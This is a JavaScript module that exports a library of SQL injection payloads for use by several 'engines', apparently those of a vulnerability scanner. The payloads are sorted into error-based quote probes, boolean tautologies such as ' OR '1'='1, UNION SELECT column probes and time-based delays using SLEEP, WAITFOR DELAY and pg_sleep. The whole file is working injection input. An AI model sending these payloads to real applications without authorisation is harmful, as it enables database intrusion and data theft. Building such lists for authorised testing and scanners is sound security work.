/*
|--------------------------------------------------------------------------
| SQL Injection Payload Library
|--------------------------------------------------------------------------
| Organized by attack technique.
| Every engine imports this file.
*/

module.exports = {

  errorBased: [
    "'",
    "\"",
    "')",
    "\")",
    "'--",
    "\"--",
    "'#",
    "\"#"
  ],

  booleanBased: [
    "' OR '1'='1",
    "' AND '1'='2",
    "\" OR \"1\"=\"1",
    "\" AND \"1\"=\"2",
    "' OR 1=1--",
    "' AND 1=2--"
  ],

  unionBased: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--"
  ],

  timeBased: [
    "' OR SLEEP(5)--",
    "\" OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'||(SELECT pg_sleep(5))--"
  ]

};
